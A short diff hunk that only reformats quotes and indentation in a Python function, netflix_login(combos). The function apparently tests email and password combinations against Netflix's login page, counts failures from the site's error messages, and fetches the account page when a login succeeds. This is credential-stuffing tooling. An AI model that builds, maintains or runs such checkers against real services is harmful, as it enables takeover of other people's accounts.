@@ -339,13 +339,13 @@ def netflix_login(combos):
 
         if (
             "Sorry, we can't find an account with this email address. Please try again or"
-             in request.text
+            in request.text
         ):
             bad += 1
-            print('No email.')
+            print("No email.")
         elif "Incorrect password" in request.text:
             bad += 1
-            print('Incorrect pass.')
+            print("Incorrect pass.")
         else:
             info = client.get(
                 "https://www.netflix.com/YourAccount",
